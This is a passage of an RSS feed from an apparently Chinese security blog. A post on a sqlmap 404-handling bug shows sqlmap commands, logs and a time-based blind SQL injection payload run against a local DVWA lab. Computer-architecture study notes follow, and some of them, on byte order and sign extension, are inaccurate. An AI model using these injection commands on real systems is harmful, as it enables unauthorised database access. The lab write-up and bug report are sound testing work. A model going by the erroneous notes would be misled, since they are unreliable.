        if re.search(r&quot;(页面不存在)|(未找到页面)|(page\s+not\s+found)|(404\s+not\s+found)&quot;, content, re.I) or re.search(r&quot;404&quot;, title, re.I):
            if re.search(r'''&amp;lt;form\s+[^&amp;lt;&amp;gt;]*&amp;gt;''', content, re.I):
                input(&quot;需要调整代码!!!!!!!!!&quot;)
            else:
                return get_request(url, by=&quot;MechanicalSoup&quot;)
        # time.sleep(5) # Let the user actually see something!
        # driver.quit()

    except TimeoutException as e:
        # Handle your exception here
        print(e)
    finally:
        driver.quit()

    return {
        'code': code,
        'title': title,
        # 下面比较特殊,PhantomJS得到的html不用decode,直接就是string类型
        'content': content,
        #True or False
        'hasFormAction': hasFormAction,
        # eg,https://www.baidu.com^a=1&amp;amp;b=2
        # eg,https://www.baidu.com/?a=1&amp;amp;b=2
        # 上面?表示formAction对应get请求,^表示formAction对应post请求
        'formActionValue': formActionValue}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
</description>
        <pubDate>Mon, 21 Aug 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/08/21/selenium%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95%E6%96%B9%E6%A1%88/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/08/21/selenium%E8%87%AA%E5%8A%A8%E6%8F%90%E4%BA%A4%E8%A1%A8%E5%8D%95%E6%96%B9%E6%A1%88/</guid>
        
        <category>python</category>
        
        <category>selenium</category>
        
        <category>form</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>sqlmap对状态码404处理的bug</title>
        <description>&lt;h3 id=&quot;about&quot;&gt;About&lt;/h3&gt;

&lt;p&gt;sqlmap对页面遇到404响应码后直接抛出一个异常并退出sqlmap不再进行后续的paylaod测试,在用sqlmap测试sql注入点的时候,一
般用到&lt;code class=&quot;highlighter-rouge&quot;&gt;--batch&lt;/code&gt;参数来节省时间,这种情况下sqlmap有一处对http状态码404的处理不当导致无法测出注入点的bug&lt;/p&gt;

&lt;h3 id=&quot;detail&quot;&gt;Detail&lt;/h3&gt;

&lt;p&gt;在爬虫时get请求的url可轻易爬到,但是post请求的url及post的数据的取得需要探测html中有没有表单相关的关键字,并通过表单
来构造post参数的值并提交来获取后续返回内容,如下例中详情:&lt;/p&gt;

&lt;p&gt;安装dvwa设置level=low,测试&lt;code class=&quot;highlighter-rouge&quot;&gt;SQL Injection(Blind)&lt;/code&gt;这一项时,参数是通过表单来提交的,点击&lt;code class=&quot;highlighter-rouge&quot;&gt;submit&lt;/code&gt;提交后会将输入框&lt;code class=&quot;highlighter-rouge&quot;&gt;User
ID&lt;/code&gt;中的内容以get请求发送到服务器,例如在文本框中输入1则浏览器将对应访问&lt;code class=&quot;highlighter-rouge&quot;&gt;http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/?id=1&amp;amp;Submit=Submit#&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/sqlmap404bug-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;尝试用sqlmap跑出这个注入点,语句如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u &quot;http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/?id=1&amp;amp;Submit=Submit#&quot; --cookie='PHPSESSID=glgav33fgc0l1hoikg5f267j51;security=low'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这样是可以跑出来的,但是要提高效率用工具自动发现这个漏洞时,一般这样用sqlmap:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u &quot;http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/&quot; --forms --batch -v 3 --cookie='...'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;由于这里的id参数的值通过爬虫无法获得,因为这个id参数的值是通过表单提交的,爬虫最多可得到的url为:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/?id=&amp;amp;Submit=Submit#
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;上图中的&lt;code class=&quot;highlighter-rouge&quot;&gt;Submit&lt;/code&gt;按钮对应的应该是js处理的动作,js将表单通过get请求发送到服务器,这种情况下,需要用selenium+phantomjs
来获得上面的url(或者使用sqlmap中的&lt;code class=&quot;highlighter-rouge&quot;&gt;--forms&lt;/code&gt;参数来捕获这样的表单),而就算得到了url,由于这个url中的&lt;code class=&quot;highlighter-rouge&quot;&gt;id=&lt;/code&gt;,也即id值为空,
这种情况下,sqlmap的&lt;code class=&quot;highlighter-rouge&quot;&gt;--batch&lt;/code&gt;参数的处理是随机赋值给id并测试各种payload(eg,id=1389),然而dvwa中的这个页面在服务器上的
处理并不一般,如果用户提交的id参数在服务器上没有查询到,服务器会响应404状态码(可能一般waf也会这样做),而sqlmap遇到
404状态码,直接就抛出异常并退出了,这样导致无法用sqlmap的&lt;code class=&quot;highlighter-rouge&quot;&gt;--batch&lt;/code&gt;参数测出这个sql注入点&lt;/p&gt;

&lt;p&gt;其实如果用selenium+phantomjs得到了url&lt;code class=&quot;highlighter-rouge&quot;&gt;http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/?id=&amp;amp;Submit=Submit#&lt;/code&gt;后
如果服务器正常响应查询(这里的dvwa不正常响应,对查不到的统一返回404状态码),用sqlmap是可以检测到这种不带具体值的参数
类型url的注入点的,但是要设置&lt;code class=&quot;highlighter-rouge&quot;&gt;--risk=3&lt;/code&gt;,默认的sqlmap的risk值为1,为1时sqlmap不会测试&lt;code class=&quot;highlighter-rouge&quot;&gt;' or [sqli] and '1'='1&lt;/code&gt;(要测出
不带参数值的参数的注入点则要通过&lt;code class=&quot;highlighter-rouge&quot;&gt;or&lt;/code&gt;来测试),也即要发挥sqlmap的功能最好设置&lt;code class=&quot;highlighter-rouge&quot;&gt;--batch --risk=3 --forms&lt;/code&gt;.试试直接用这种
方法测试上面的注入点(在dvwa中对应的页面为&lt;code class=&quot;highlighter-rouge&quot;&gt;http://192.168.8.190/dvwa/vulnerabilities/sqli_blind/&lt;/code&gt;):&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/tmp/sqlmap [master] » python2 sqlmap.py -u &quot;192.168.8.190/dvwa/vulnerabilities/sqli_blind/&quot; --forms -v 3 --cookie='PHPSESSID=glgav33fgc0l1hoikg5f267j51;security=low' --risk 3 --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.1.8.6#dev}
|_ -| . [(]     | .'| . |
|___|_  [&quot;]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 14:40:30

[14:40:30] [DEBUG] cleaning up configuration parameters
[14:40:30] [DEBUG] setting the HTTP timeout
[14:40:30] [DEBUG] setting the HTTP Cookie header
[14:40:30] [DEBUG] creating HTTP requests opener object
[14:40:30] [DEBUG] resolving hostname '192.168.8.190'
[14:40:30] [INFO] testing connection to the target URL
[14:40:30] [DEBUG] declared web page charset 'utf-8'
[14:40:30] [INFO] searching for forms
[14:40:30] [DEBUG] initializing the knowledge base
[#1] form:
GET http://192.168.8.190:80/dvwa/vulnerabilities/sqli_blind/?id=&amp;amp;Submit=Submit
Cookie: PHPSESSID=glgav33fgc0l1hoikg5f267j51;security=low
do you want to test this form? [Y/n/q]
&amp;gt; Y
[14:40:30] [DEBUG] used the default behaviour, running in batch mode
Edit GET data [default: id=&amp;amp;Submit=Submit]: id=&amp;amp;Submit=Submit
[14:40:30] [DEBUG] used the default behaviour, running in batch mode
do you want to fill blank fields with random values? [Y/n] Y
[14:40:30] [DEBUG] used the default behaviour, running in batch mode
[14:40:30] [INFO] resuming back-end DBMS 'mysql'
[14:40:30] [INFO] using '/var/root/.sqlmap/output/results-08202017_0240pm.csv' as the CSV results file in multiple targets mode
[14:40:30] [DEBUG] resolving hostname '192.168.8.190'
[14:40:30] [DEBUG] declared web page charset 'utf-8'
[14:40:30] [CRITICAL] page not found (404)
[14:40:30] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 1 times
[14:40:30] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/var/root/.sqlmap/output/results-08202017_0240pm.csv'

[*] shutting down at 14:40:30
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;发现sqlmap跑不出来,尝试修改sqlmap代码,结果中有关键字&lt;code class=&quot;highlighter-rouge&quot;&gt;page not found (404)&lt;/code&gt;,于是定位相关代码:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cd /tmp/sqlmap &amp;amp;&amp;amp; grep -r &quot;page not found&quot; .
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;结果如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./lib/request/connect.py:                    errMsg = &quot;page not found (%d)&quot; % code
./lib/request/connect.py:                    debugMsg = &quot;page not found (%d)&quot; % code
./lib/utils/crawler.py:                    if &quot;page not found&quot; in getSafeExString(ex):
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;于是修改./lib/request/connect.py中代码:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;elif ex.code == httplib.NOT_FOUND:
    if raise404:
        errMsg = &quot;page not found (%d)&quot; % code
        raise SqlmapConnectionException(errMsg)
    else:
        debugMsg = &quot;page not found (%d)&quot; % code
        singleTimeLogMessage(debugMsg, logging.DEBUG)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;将其中的raise SqlmapConnectionException(errMsg)注释掉后再重新用刚才的sqlmap语句测试可测出这个注入点,详情如下:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/tmp/sqlmap [master●] » python2 sqlmap.py -u &quot;192.168.8.190/dvwa/vulnerabilities/sqli_blind/&quot; --forms -v 3 --cookie='PHPSESSID=glgav33fgc0l1hoikg5f267j51;security=low' --risk 3 --batch
[14:48:41] [DEBUG] checking for filtered characters
[14:48:41] [PAYLOAD] OOFt' OR 6597=IF((3988&amp;gt;3987),SLEEP(5),6597) AND 'sIjt'='sIjt
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
[14:49:06] [DEBUG] used the default behaviour, running in batch mode
sqlmap identified the following injection point(s) with a total of 146 HTTP(s) requests:
    ---
Parameter: id (GET)
    Type: AND/OR time-based blind
    Title: MySQL &amp;gt;= 5.0.12 OR time-based blind
    Payload: id=OOFt' OR SLEEP(5) AND 'CaKs'='CaKs&amp;amp;Submit=Submit
    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
    ---
do you want to exploit this SQL injection? [Y/n] Y
[14:49:06] [DEBUG] used the default behaviour, running in batch mode
[14:49:06] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.25
back-end DBMS: MySQL &amp;gt;= 5.0.12
[14:49:06] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 131 times
[14:49:06] [INFO] you can find results of scanning in multiple targets mode inside the CSV file
'/var/root/.sqlmap/output/results-08202017_0246pm.csv'

[*] shutting down at 14:49:06
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;已提交pull request到sqlmap,相关代码文件为&lt;code class=&quot;highlighter-rouge&quot;&gt;lib/request/connect.py&lt;/code&gt;,&lt;a href=&quot;https://github.com/sqlmapproject/sqlmap/pull/2663&quot;&gt;follow&lt;/a&gt;&lt;/p&gt;

</description>
        <pubDate>Sun, 20 Aug 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/web/2017/08/20/sqlmap%E5%AF%B9%E7%8A%B6%E6%80%81%E7%A0%81404%E5%A4%84%E7%90%86%E7%9A%84bug/</link>
        <guid isPermaLink="true">http://localhost:4000/web/2017/08/20/sqlmap%E5%AF%B9%E7%8A%B6%E6%80%81%E7%A0%81404%E5%A4%84%E7%90%86%E7%9A%84bug/</guid>
        
        <category>sqlmap</category>
        
        <category>python</category>
        
        
        <category>web</category>
        
      </item>
    
      <item>
        <title>深入理解计算机系统第3章笔记</title>
        <description>&lt;h3 id=&quot;程序的机器级表示&quot;&gt;程序的机器级表示&lt;/h3&gt;

&lt;p&gt;1.编译器驱动程序将源文件翻译成可执行目标文件可分为4个阶段完成&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp3-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;a.&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -O1 -S hello.c&lt;/code&gt;中:gcc也可用cc缩写代替,-O1表示编译器优化级别,-S表示生成汇编代码,结果为hello.s[汇编]
b.&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -O1 -c hello.c&lt;/code&gt;:gcc会编译并汇编,得到hello.o,hello.o是二进制格式,可用&lt;code class=&quot;highlighter-rouge&quot;&gt;objdump -d hello.o&lt;/code&gt;查看汇编格式内容
c.&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -O1 -o hello hello.o main.c&lt;/code&gt;:可由gcc产生可执行文件hello,可用&lt;code class=&quot;highlighter-rouge&quot;&gt;objdump -d hello&lt;/code&gt;反汇编hello这个可执行文件[反汇编]
d.上面a中的汇编过程默认得到的为ATT格式的汇编代码,要得到intel格式的指令为:&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -O1 -S -masm=intel hello.c&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;2.gcc生成的汇编指令都有一个字符后缀,表明操作数的大小,movb表示传送字节(eg,对应al/ah),movw表示传送字(eg,对应ax/bx),
movl表示传送双字(eg,对应eax/ebx)&lt;/p&gt;

&lt;p&gt;3.mov指令有个限制,传送指令的两个操作数不能都指向存储器位置.eg,mov [0x1000],[0x2000]是不允许的,需要mov eax,[0x1000]先,再mov [0x2000],eax&lt;/p&gt;

&lt;p&gt;4.movs和movz都是将一个较小的数据复制到一个较大的数据位置,高位用符号位扩展(movs)或者用零位扩展(movz)进行填充&lt;/p&gt;

&lt;p&gt;5.movsbl:将b符号扩展(s)成l格式后再mov到l,movzwl:将w零扩展(z)成l后再mov到l,eg:假设%dh=CD(1100 1101),%eax=98765432&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;movb %dh,%al        %al=%dh=CD,%eax=987654CD
movsbl %dh,%eax     sbl:%dh-&amp;gt;FFFFCD,%eax=FFFFCD
movzbl %dh,%eax     zbl:%dh-&amp;gt;0000CD,%eax=0000CD
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;6.左移右移汇编指令&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sal:算术左移
shl:逻辑左移
sar:算术右移
shr:逻辑右移
sal=shl,只有算术右移(sar)操作要求区分有符号和无符号操作数,shr在高位补0,sal和shl在低位补0,这个特性使得补码运算
成为实现有符号整数运算的一种比较好的方法
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;7.c/c++中的goto与汇编中的jmp addr等同,条件数据传送指令比条件控制转移的性能好&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;条件数据传送,eg:
cmp %edx,%ecx
cmovl %ebx,%eax(此处的l代表less,不是att中的movl中的long)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;8.leave+ret恢复栈的状态到调用函数前&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;leave=mov esp,ebp+pop ebp[执行pop ebp后此时esp指向的是old_eip]
retn n==pop eip+mov esp,esp+4*n+jmp eip

(栈中大地址)
参数n
...
参数1
old_eip     &amp;lt;--对应--&amp;gt;      push old_eip
old_ebp     &amp;lt;--对应--&amp;gt;      push ebp+mov ebp
被保存的寄存器,本地变量和临时变量
(栈中小地地)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;9.寄存器使用惯例&lt;/p&gt;

&lt;p&gt;a)eax,edx,ecx被划分为&lt;code class=&quot;highlighter-rouge&quot;&gt;调用者保存&lt;/code&gt;寄存器  [x86-64中变成r10和r11两个寄存器]&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;过程p调用q时,q可以覆盖这些寄存器,而不会破坏任何p所需要的数据
也即调用者在调用其它函数前会自行保存这些寄存器在调用者的栈桢中,调用完成后会恢复(pop)这些保存过的寄存器
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;b)ebx,esi,edi被划分为&lt;code class=&quot;highlighter-rouge&quot;&gt;被调用者保存&lt;/code&gt;寄存器   [x86-64中变成:rbx,rbp,r12-r15]&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;q必须在覆盖这些寄存器的值之前,先把它们保存到栈中,并在返回前恢复
也即被调用者在返回到调用者的栈桢中前会在当前被调用者自己的栈桢中保存这些寄存器,并在返回前恢复(pop)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;10.被调用的函数的参数在被调用的函数当前栈桢中的位置如下,其中ebp是被调用函数当前栈桢中的ebp,old_eip是在调用被调用
函数的调用函数中的call xxx(xxx表示被调用函数的名称)所在汇编语句的下一句汇编语句的内存地址&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;old_eip:ebp+0x4
第1个参数:ebp+0x8
第2个参数:ebp+0xc
第n个参数:ebp+0x4(n+1)
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;11.c语言允许对指针进行运算,而计算出来的值会根据该值引用的数据类型的大小进行伸缩,也就是说,如果p是一个指向类型为T的
数据的指针,p的值为&lt;script type=&quot;math/tex&quot;&gt;X{i}&lt;/script&gt;,那么表达式p+i的值为&lt;script type=&quot;math/tex&quot;&gt;X{p}+l\ast i&lt;/script&gt;,这里l是数据类型t的大小&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

int main(){

    int iV=3;
    void* a=&amp;amp;iV;
    printf(&quot;a:%p&quot;,a);
    void *b=a+1;
    void *c=a-1;
    printf(&quot;\n&quot;);
    printf(&quot;b=a+1:%p&quot;,b);
    printf(&quot;\n&quot;);
    printf(&quot;c=a-1:%p&quot;,c);
    printf(&quot;\n&quot;);
    printf(&quot;b-a:%p&quot;,b-a);

    return 0;

}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;上面运行结果为&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a:0x7fff508f85c8
b=a+1:0x7fff508f85c9
c=a-1:0x7fff508f85c7
b-a:0x1#
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;将其中的&lt;code class=&quot;highlighter-rouge&quot;&gt;void *&lt;/code&gt;换成&lt;code class=&quot;highlighter-rouge&quot;&gt;int *&lt;/code&gt;后代码如下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

int main(){

    int iV=3;
    int* a=&amp;amp;iV;
    printf(&quot;a:%p&quot;,a);
    int *b=a+1;
    int *c=a-1;
    printf(&quot;\n&quot;);
    printf(&quot;b=a+1:%p&quot;,b);
    printf(&quot;\n&quot;);
    printf(&quot;c=a-1:%p&quot;,c);
    printf(&quot;\n&quot;);
    printf(&quot;b-a:%p&quot;,b-a);

    return 0;

}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;运行结果变成如下&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a:0x7fff506ab5c8
b=a+1:0x7fff506ab5cc
c=a-1:0x7fff506ab5c4
b-a:0x1#
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;12.类似于数组的实现,结构的所有组成部分都存放在存储器中一段连续的区域内,python中没有结构体,可用类来代替&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;class mystruct:

    def __init__(self):
        self.name=&quot;&quot;
        self.size=10
        self.list=[]

a=mystruct()
a.name='cup'
a.size=8
a.list.append('water')
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;13.一个联合(union类型)的总的大小等于它最大字段的大小,联合中的每个元素的偏移都是0&lt;/p&gt;

&lt;p&gt;14.DDD是GDB的一个扩展,提供了图形界面,据说功能强大&lt;a href=&quot;http://blog.csdn.net/yangzm/article/details/51793023&quot;&gt;follow&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;15.x86-64下寄存器比IA32的寄存器:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;寄存器数量翻倍至16个,新增加的寄存器命名为%r8-%r15
可直接访问每个寄存器的低32位(%eax,%ecx,%edx...,%r8d-%r15d)
可直接访问每个寄存器的低16位(%ax,%cx,%dx...,%r8w-%r15w)
可直接访问每个寄存器的低8位
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp3-2.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;16.x86-64与栈相关的特性&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a)将函数参数保存在寄存器上,不保存在栈上(参数&amp;gt;6个除外)
b)程序不再需要信赖栈来存储和获取过程信息,极大地减少了过程调用和返回的开销
c)最多可以有6个整型(整数和指针)参数可以通过寄存器进行传递,寄存器名对应于所传递的数据的大小,如下图
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp3-3.png&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;d)在调用过程中,栈指针保存在固定的位置(rsp),使得可以用相对于栈指针的偏移量来访问数据,因此不再需要栈底指针(ebp)
e)函数过程的栈帧通常有固定的大小,在过程开始时通过减小栈指针(rsp)来设置(如某函数的开始就是subq $32,%rsp)
f)使得函数可能需要栈帧的原因如下:
    1)局部变量大多,不能都放在寄存器中
    2)有些局部变量是数组或是结构
    3)函数用取地址操作符(&amp;amp;)来计算一个局部变量的地址
    4)函数必须将栈上的某些参数传递到另一个函数
    5)在修改一个被调用者保存的寄存器前,函数需要保存它的状态
g)gcc认为用32字节来保存所有的局部变量和剩余无法存放在寄存器中的函数的参数就足够了(32字节对应4个栈单元)
h)上面g的好处是为了尽量减少栈指针(rsp)的移动次数,简化编译器用相对于栈指针的偏移量产生对栈元素的引用的任务
i)在函数开始没有push ebp(32位下为push ebp+mov ebp,esp)了,变成了subq $32,%rsp
j)函数最多可以访问超过当前栈指针(rsp)128个字节的栈上存储空间(address&amp;lt;rsp的内存地址空间)
k)x86-64 ABI将j中的这个区域称为红色地带,必须保持当rsp移动时,红色地带可读可写
l)阅读64位反汇编代码可参考如下链接
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;a href=&quot;http://download.csdn.net/download/lpangbing/4237727&quot;&gt;x86-64 ABI文档&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;17.为什么IA32中ebp+0的下一个(高地址)栈单元的地址是ebp+4而不是ebp+0x20? [(x86-64)中ebp+8的下一个栈单元的地址是ebp+16]&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;IA32中每个栈单元是32位(4个字节大小),而计算机的最小存储单元是字节,也即eg,如果0x10000000中开始的内存内容为abcd,
那么0x10000001中存放的内容为b,也即1个内存地址差对应8位(1字节)的内存容量,如下图od截图中左下角的数据窗口中内存
地址与内容数据的对应关系.
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/od1.png&quot; /&gt;&lt;/p&gt;

</description>
        <pubDate>Wed, 16 Aug 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/08/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC3%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/auxilary/2017/08/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC3%E7%AB%A0%E7%AC%94%E8%AE%B0/</guid>
        
        <category>csapp</category>
        
        
        <category>auxilary</category>
        
      </item>
    
      <item>
        <title>深入理解计算机系统第2章笔记</title>
        <description>&lt;h3 id=&quot;信息的表示和处理&quot;&gt;信息的表示和处理&lt;/h3&gt;

&lt;p&gt;1.不同数据类型在不同位数的操作系统下的内存长度
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp2-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2.大端和小端
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp2-2.png&quot; /&gt;
&lt;img src=&quot;https://raw.githubusercontent.com/3xp10it/pic/master/csapp2-3.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;大端(big endian)以高位数值存到内存地址的低位(以大数结尾)&lt;br /&gt;
小端(little endian)以低位数值存到内存地址的高位(以小数结尾)&lt;br /&gt;
网络上的字节序为大端,而计算机上的字节序一般为小端,于是在发送到网络上之前需要转换一次,否则数据发送到目的地会被对方
理解错了,什么转换方法好呢?如果转换成char类型当然好,因为char类型的数据只占一个字节,没有大端和小端的区别,eg:
将int(127)发到网络上去,127需要(2**xx7=128)7bits也即1B的数据量传输,转成char类型为”127”需要(1,2,7分别作为char)需要
3B的传输量,这样的话需要传输3倍的数据量,效率太低了,于是不用这种方法,采用base64将本地数据编码后传输到网络上去&lt;/p&gt;

&lt;p&gt;3.数据的表现形式有两种:&lt;code class=&quot;highlighter-rouge&quot;&gt;无符号&lt;/code&gt;类型和&lt;code class=&quot;highlighter-rouge&quot;&gt;补码&lt;/code&gt;类型,负数用补码表示,可由对应正数取反加1得到,eg:-4的表示形式&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;4的二进制表示形式是0100,取反加1为:1011+1=1100
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;4.负数的计算为:-1x最高位(1)x2x2..2[位数-1]+除最高位以外的其他位的正数值&lt;/p&gt;

&lt;script type=&quot;math/tex; mode=display&quot;&gt;B2T(X) = -x_{w-1} \cdot 2^{w-1} + \sum_{i=0}^{w-2} x_i \cdot 2^i&lt;/script&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;eg,1100这个负数的值计算方法为:-1x1x2x2x2+1x2x2+0x2+0=-8+4=-4
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;5.如果一个表达式中包含有符号数和无符号数则会默认将有符号数转换成无符号数&lt;/p&gt;
</description>
        <pubDate>Fri, 11 Aug 2017 00:00:00 +0800</pubDate>
        <link>http://3xp10it.cc/auxilary/2017/08/11/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%E7%AC%AC2%E7%AB%A0%E7%AC%94%E8%AE%B0/</link>
